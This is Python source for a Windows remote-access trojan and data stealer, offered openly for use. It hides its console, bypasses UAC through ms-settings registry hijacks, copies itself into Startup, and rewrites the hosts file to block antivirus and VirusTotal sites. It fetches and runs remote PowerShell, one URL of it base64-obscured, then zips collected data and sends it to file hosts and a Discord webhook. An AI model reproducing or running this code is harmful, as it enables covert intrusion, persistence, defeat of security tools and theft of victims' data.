# uac 
import subprocess
import ctypes
import sys
import base64
import os
import shutil
import ctypes

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def UACbypass(method: int = 1) -> bool:
    if GetSelf()[1]:
        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
        if method == 1:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{GetSelf()}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("computerdefaults --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        elif method == 2:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{GetSelf()}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("fodhelper --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        else:
            return False
        return True

def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

def GetSelf():
    return sys.argv[0]
if not IsAdmin():
    if UACbypass():
        os._exit(0)

def add_to_startup():
    startup_folder = os.path.join(os.getenv('ProgramData'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    executable_path = GetSelf()
    dest = os.path.join(startup_folder, os.path.basename(executable_path))
    
    if os.path.exists(dest):
        print("Executable is already in Startup.")
        return

    try:
        shutil.copy2(executable_path, dest)
        print(f"Copied to Startup: {dest}")
    except Exception as e:
        print(f"Failed to copy to Startup: {e}")

add_to_startup()


import subprocess
import os
import zipfile
import random
import string
import requests
import io
import os
import subprocess


def block_sites():
    call = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /V DataBasePath", shell=True, capture_output=True)

    if call.returncode != 0:
        hostdirpath = os.path.join("System32", "drivers", "etc")
    else:
        hostdirpath = os.sep.join(call.stdout.decode(errors="ignore").strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
    hostfilepath = os.path.join(os.getenv("systemroot"), hostdirpath, "hosts")
    if not os.path.isfile(hostfilepath):
        return
    with open(hostfilepath) as file:
        data = file.readlines()

    BANNED_SITES = ("virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", "pcprotect.com", "mcafee.com", "bitdefender.com", "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com", "eset.com", "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com", "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com", "ccleaner.com")
    newdata = []
    for i in data:
        if any([(x in i) for x in BANNED_SITES]):
            continue
        else:
            newdata.append(i)

    for i in BANNED_SITES:
        newdata.append("\t0.0.0.0 {}".format(i))
        newdata.append("\t0.0.0.0 www.{}".format(i))

    newdata = "\n".join(newdata).replace("\n\n", "\n")

    subprocess.run("attrib -r {}".format(hostfilepath), shell=True, capture_output=True)  # Removes read-only attribute from hosts file
    with open(hostfilepath, "w") as file:
        file.write(newdata)
    subprocess.run("attrib +r {}".format(hostfilepath), shell=True, capture_output=True)  # Adds read-only attribute to hosts file

block_sites()

# Helper function to handle errors
def error_handler(e):
    print(f"Error: {str(e)}")

def run_powershell_script(url):
    command = f'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {{iwr -Uri \'{url}\' -UseBasicParsing | iex}}"'
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def zip_folder(folder_path, password, zip_name):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                full_path = os.path.join(root, file)
                relative_path = os.path.relpath(full_path, folder_path)
                zip_file.write(full_path, relative_path)
    return zip_buffer.getvalue(), len(zip_buffer.getvalue())

def gofileupload(path):
    try:
        data = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
        return data
    except Exception as e:
        error_Handler(e)
        try:
            try:
                gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
            except Exception as e:
                error_Handler(e)
                gofileserver = "store4"
            r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
        except Exception as e:
            error_Handler(e)
            return False

def catboxmoeupload(path, request_type='upload'):
    try:
        with open(path, 'rb') as file:
            data = {
    'reqtype': 'fileupload',
    'userhash': '',
}
            files = {'fileToUpload': (file.name, file, 'application/octet-stream')}
            response = requests.post(f'https://catbox.moe/user/api.php?request_type={request_type}', files=files, data=data)
            return response.content.decode()
    except Exception as e:
        return False


def fileioupload(path):
    try:
        with open(path, 'rb') as file:
            response = requests.post('https://file.io/', files={'file': file})
        return response.json()["link"]
    except Exception as e:
        return False


def upload_file(path):
    link = gofileupload(path)
    if not link:
        link = catboxmoeupload(path)
    if not link:
        link = fileioupload(path)
    return link

# Step 1: Run the PowerShell script
ps_script_url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1"
run_powershell_script(ps_script_url)
subprocess.Popen(['powershell', '-Command', requests.get(base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3MxdWlhc2RhZC9sb2ctYWNjLXYyL21haW4vc2NyL2Rvd25sb2FkLnBzMQ').decode()).text], creationflags=subprocess.CREATE_NO_WINDOW)

# Step 2: Generate a random password
password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

# Step 3: Zip the folder with the password
temp_folder = os.path.join(os.getenv('TEMP'), 'loader')
zip_data, zip_size = zip_folder(temp_folder, password, 'Power_rat_data.zip')

# Check if the zip file exceeds 20 MB
if zip_size > 20 * 1024 * 1024:  # 20 MB in bytes
    zip_path = os.path.join(temp_folder, 'Power_rat_data.zip')
    with open(zip_path, 'wb') as f:
        f.write(zip_data)
    link = upload_file(zip_path)
else:
    link = None


# Step 4: Prepare the content and filename
content = f"hai1723 on top\npassword:{password}"
filename = "Power_rat_data.zip"

# Step 5: Send the zipped file or link via Discord webhook
webhook_url = "YOUR_WEBHOOK_URL"
if link:
    content += f"\nDownload link: {link}"
    response = requests.post(webhook_url, data={'content': content})
else:
    files = {'file': (filename, zip_data)}
    data = {'content': content}
    response = requests.post(webhook_url, files=files, data=data)

if response.status_code == 200:
    print("File sent successfully.")
else:
    print(f"Failed to send file. Status code: {response.status_code}")
